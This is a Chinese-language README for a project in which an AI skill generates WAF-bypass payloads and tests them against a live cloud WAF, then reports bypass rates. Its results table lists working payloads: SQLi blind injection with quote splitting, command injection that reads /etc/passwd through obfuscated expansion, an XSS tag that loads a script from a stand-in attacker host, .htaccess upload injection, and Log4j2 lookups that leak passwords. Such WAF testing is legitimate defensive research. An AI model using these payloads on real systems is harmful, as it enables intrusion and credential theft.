# WAF 语义绕过测试 · AI 驱动样本构建

> 面向 WAF 语义引擎的能力验证：以 **AI 自主安全研究员 Skill** 为核心，约束「场景 + 攻击目标 + 成功标志」、不限制攻击路径，泛化生成高质量攻击用例并对真实云 WAF 远程实测，产出可复现的绕过样本库。

---

## 🎯 项目背景

WAF 正从传统规则引擎向语义引擎演进。在命令注入、SQL 注入、Log4j 反序列化等场景中，攻击命令形态松散，单纯依赖新增规则拦截会陷入被动；攻击者大量借助多层/嵌套编码对载荷变形绕过。

本项目在**确定场景、确定攻击目标、确定成功标志**的前提下，不限制攻击路径、仅约束生成方向，用 AI 泛化生成攻击测试用例，验证 WAF 语义引擎在**意图级语义识别**与**多样化编码解码还原**两方面的能力边界。

两条能力线：**语义绕过**（本 Skill 已落地）与**编码绕过**（规划中，作为语义的变形维度叠加）。

---

## 🧠 核心：semantic-mining Skill v2（语义挖掘）

自主安全研究员 Skill。核心是**生成 payload**——生成 → 远程实测 → 学习 → 聚焦有效维度，产出能真正绕过 WAF 的样本。

### 4 步循环

```
/semantic-mining <scenario> [--batches N] [--focus <direction_id>]
```

1. **生成**（AI 智力密集）：从知识库 **216 原语** + 上一轮数据选方向，每条 payload 必须带「机制 + 理由」（WAF 看到 X，解析器做 Y → 为什么能绕）
2. **执行 + 学习**（机械）：入库去重 → Layer2 模板派生变体 → 远程实测 → 回写维度统计
3. **变强检查**（主动）：自动检测知识缺口（全拦 / 停滞 / KB 覆盖不足），主动申请联网检索扩充知识库
4. **汇报 + 询问**：每批输出摘要 + 推荐下一方向，永不默默停下

### 学习循环（数据驱动，不靠人设判断）

- 按原语聚合实测通过率，分档：**confirmed（≥60%）/ boundary / dead（=0%）**
- 熵优先选择下一方向（`info = p(1-p)`），有效维度被深挖、无效维度被剪枝
- **同义近义迭代**：对成功样本做同义替换派生新表达（`AND→&&`、`=→LIKE`、`FROM`，实测通过率统计入库，不标 100%）
- **结构新颖性优先**：`lib/structures.py` 每轮输出结构覆盖报告，设计目标锁定零通过/低覆盖结构，禁止只深化已 confirmed
- **语句合成器**：`lib/composer.py` 从「语句骨架 × 语法部件」结构性生成全新语句（`GET_LOCK`/`TABLE`/`CTE`/`HANDLER`），解耦新颖性与手写种子
- **种子策展**：`curate_seeds.py` 把通过样本按结构类提炼进 `knowledge/seeds.jsonl`，进化种子库
- **CMDi 语法门禁**：远程源站不执行命令，`bash -n` 本地校验后再实测，剔除无效载荷
- X-WAF-UUID 追踪，检测 WAF 规则升级并触发重基线复验

### 知识库

- `knowledge/advanced_bypass.md` — 5 场景 × 绕过维度（词法/语法/语义层，纯语义不碰编码）
- `knowledge/synonyms.json` — 机器可读同义词表（迭代引擎）
- `knowledge/confirmed_techniques.jsonl` — 学习回写：对当前 WAF 实测有效的技法
- `knowledge/evaluation_rubric.md` — 有效/危害/洞察/可用 四维质量评分

---

## 📦 样本平台（platform/）

维护与展示样本库的 CLI + Web 仪表盘，读写 skill 的 corpus：

```bash
# CLI
python3 platform/cli.py corpus list --scenario sqli --status passed   # 样本库查询
python3 platform/cli.py report                                        # 统计报表 (md/json)
python3 platform/cli.py test run --status pending --limit 20          # 远程批量实测
python3 platform/cli.py test status                                   # 状态总览
python3 platform/cli.py corpus export --scenario sqli --format md     # 导出

# Web 仪表盘 (Flask)
python3 platform/server.py --port 8787    # http://127.0.0.1:8787
```

仪表盘：总览指标 / 样本库筛选 / 样本详情（机制+测试历史） / 知识库浏览 / Skill 状态。

---

## 📊 样本成果（实测通过样本库）

> 口径：样本库为 **AI 生成 → 远程实测全量记录**（HTTP 200 = WAF 放行 / 403 = 拦截）。**绕过率按实测计算，非 100%**——每个样本都是真实请求，被拦的也如实入库。

| 指标 | 值 |
|---|---|
| 样本库总量 | **5,295**（已通过 2,050 · 被拦截 3,245） |
| 整体绕过率 | **≈39%**（2,050/5,295，历史累计口径） |
| 场景通过分布 | sqli 1,610 · cmdi 399 · upload 28 · xss 7（验证中）· log4j2 6（验证中） |
| 已确认技法 | **18**（confirmed ≥60% 通过率，跨 5 场景） |
| 知识库原语 | **216** |
| 实测环境 | 真实腾讯云 WAF（远程，200=放行 / 403=拦截） |

**本轮有效技法（真实通过云 WAF）**：

| 技法 | 结构/原语 | 示例 |
|------|------|------|
| CASE WHEN × REGEXP 布尔盲注 | 函数布尔盲注（原零通过，破 54 变体） | `1 AND CASE WHEN (SELECT flag FROM flags LIMIT 1) REGEXP 0x5e66 THEN 1 ELSE 2 END=1` |
| 引号拆分族 | `gen:quote_split_all`（64% confirmed） | `1 A'ND CA'SE WH'EN (SEL'ECT ...)` |
| 关键字双重写 | `gen:double_write_all`（56% boundary） | `1 ANDand CASEcase WHENwhen ...` |
| CMDi 参数展开 | 环境变量/空参（原零通过，破 10 变体） | `:;true && c'at${PATH:0:1}etc${PATH:0:1}passwd` |
| CMDi ANSI-C 引号 | `cmdi:lexical:ansi_c_quoting` | `$'\143\141\164' $'\057\145\164\143\057\160\141\163\163\167\144'` |
| XSS DOM clobbering | xss 首个通过向量（3 变体） | `<img name="currentScript" src="https://attacker.test/evil.js">` |
| Upload 配置注入 | .htaccess / user.ini（43% 通过） | `AddType application/x-httpd-php .png` |
| Log4j2 非 JNDI 泄露 | `log4j2:lookup:info_disclosure` | `${bundle:application:spring.datasource.password}` |

**关键洞察**：

1. **语义引擎对"形态完整"攻击检测强、对"零脚本语法"失手**：SQLi 结构、XSS 标签事件、JNDI 全混淆家族都被语义化覆盖；但**无任何脚本语法的 gadget（DOM clobber `<img name=currentScript>`）和配置指令（.htaccess/user.ini）是明确盲区**。
2. **词法拆分是最通用杠杆**：双写/引号拆分/反斜杠在 sqli 与 cmdi 双场景互验，靠"打断关键字连续匹配"稳定突破。
3. **Log4j2 检出强但单向**：JNDI 13 类混淆（rmi/dns/iiop/哈希片段/无点ı/lower/嵌套）全拦，但 `${bundle:}`/`${env:}` 非 JNDI 泄露全放行——信息泄露面是结构性缺口。
4. **绕过率是画出来的，不是标出来的**：云 WAF 总体拦截强（整体 38%），突破集中在边界结构；已确认技法与"样本通过"严格区分，杜绝"100% 通过"式失真。
5. **基线稳定**：WAF 规则更新（X-WAF-UUID 变更）后复验代表样本 17/17 仍通过。

---

## 🏗️ 本地靶场（辅助，用于攻击可行性验证）

语义 Skill 对远程云 WAF 实测；本地 Docker 靶场用于验证攻击本身是否成立（消除"被 WAF 拦 = 攻击无效"的歧义）。

- **架构**：浏览器 → WAF (ModSecurity CRS PL4 :8090) → App (PHP-Apache) → DB (MySQL)
- **场景**：SQLi / CMDi / 文件上传 / XSS / Log4j2，每场景 2 关
- **验证体系**：蜜标 (honeytoken) + 输出匹配 + side-effect 三层验证，攻击成功有明确 flag 标志

```bash
docker compose up -d
open http://localhost:8090/index.php
curl "http://localhost:8090/sqli/level1.php?id=1+UNION+SELECT+1,2,3"   # → 403
```

---

## 📁 项目结构

```
├── .claude/skills/semantic-mining/   # ★ 语义挖掘 Skill（自包含，可独立使用）
│   ├── SKILL.md                      #   4 步循环工作流
│   ├── lib/                          #   schema / 生成器 / 远程执行器 / 学习分析
│   │   ├── composer.py               #     语句合成器（结构性生成新语句）
│   │   └── structures.py             #     攻击结构分类 / 覆盖报告 / 新颖性缺口
│   ├── knowledge/                    #   知识库(216原语) + 已确认技法 + 种子库
│   ├── corpus/                       #   样本库 samples.jsonl + 测试事件 tests.jsonl
│   ├── scripts/                      #   run_round.py 一轮循环 / curate_seeds.py 种子策展
│   ├── rounds/                       #   各轮探针与结果记录
│   └── targets/                      #   目标环境配置
├── platform/                         # 样本平台（waf-cli + Flask 只读仪表盘）
│   ├── cli.py                        #   命令行入口
│   ├── server.py                     #   Flask 仪表盘（总览/样本库/详情/知识库/状态）
│   └── pflib/                        #   storage / report
├── app/                              # 本地靶场 PHP 应用（SQLi/CMDi/Upload/XSS/Log4j2）
├── app-log4j/                        # Log4j2 实验应用
├── waf/                              # ModSecurity CRS PL4 配置
├── db/                               # MySQL 初始化
├── samples/                          # 目标定义 / 归档（移除样本历史数据不入库）
└── docker-compose.yml                # 本地靶场编排
```

---

## 🚀 快速开始

```bash
# 1. Skill 连通性自检（需配置自己的 WAF 目标）
cd .claude/skills/semantic-mining
python3 lib/executor.py --selfcheck

# 2. 一轮机械循环（AI 写探针 → 门禁 → 派生 → 实测 → 学习）
python3 scripts/run_round.py --scenario sqli --input probes.jsonl --dry-run
python3 scripts/run_round.py --scenario sqli --input probes.jsonl --name run_sqli_r1

# 3. 平台查看成果
python3 platform/cli.py report
python3 platform/server.py --port 8787    # http://127.0.0.1:8787
```

---

## 🔒 技术约束

- 所有测试活动均在**授权范围内**进行，遵守负责任披露（Responsible Disclosure）原则
- 靶场环境本地/隔离部署，不对未授权目标攻击
- 仅用于安全研究、教育目的和 WAF 能力提升
- 攻击样本仅针对本项目自有测试环境
